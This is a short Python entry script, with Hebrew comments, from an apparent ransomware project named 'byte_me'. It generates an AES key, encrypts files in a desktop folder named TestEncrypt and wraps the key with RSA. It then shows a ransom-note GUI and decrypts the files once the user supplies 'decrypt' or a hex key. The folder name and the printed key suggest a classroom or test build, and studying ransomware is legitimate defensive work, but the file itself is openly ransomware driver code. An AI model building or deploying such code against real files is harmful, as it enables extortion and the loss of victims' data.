#!/usr/bin/env python3

import os
from Crypto.Random import get_random_bytes
from byte_me.encrypt import encrypt_files
from byte_me.decrypt import decrypt_files
from byte_me.ransom_gui import show_ransom_note
from byte_me.utils import encrypt_key_rsa, decrypt_key_rsa, log_action

def main():
    # יצירת מפתח AES אקראי (256-bit)
    key = get_random_bytes(32)
    log_action("Generated AES key")
    
    print("🔐 Original AES key:", key.hex())

    # הצפנת הקבצים בתיקייה על שולחן העבודה
    target_folder = os.path.expanduser("~/Desktop/TestEncrypt")
    encrypt_files(key, folder=target_folder)
    log_action("Files encrypted")

    # הצפנת המפתח בעזרת RSA
    encrypt_key_rsa(key)
    log_action("AES key encrypted with RSA")

    # GUI: דרישת כופר
    user_input = show_ransom_note()
    log_action(f"User input: {user_input}")

    # קבלת מפתח מחדש
    if user_input.strip().lower() == "decrypt":
        key = decrypt_key_rsa()
        print("🔓 Decrypted AES key:", key.hex())
    else:
        try:
            key = bytes.fromhex(user_input)
        except ValueError:
            print("Invalid key entered. Exiting.")
            return
    log_action("AES key recovered")

    # פענוח הקבצים באותה תיקייה
    decrypt_files(key, folder=target_folder)
    log_action("Files decrypted")

if __name__ == "__main__":
    main()
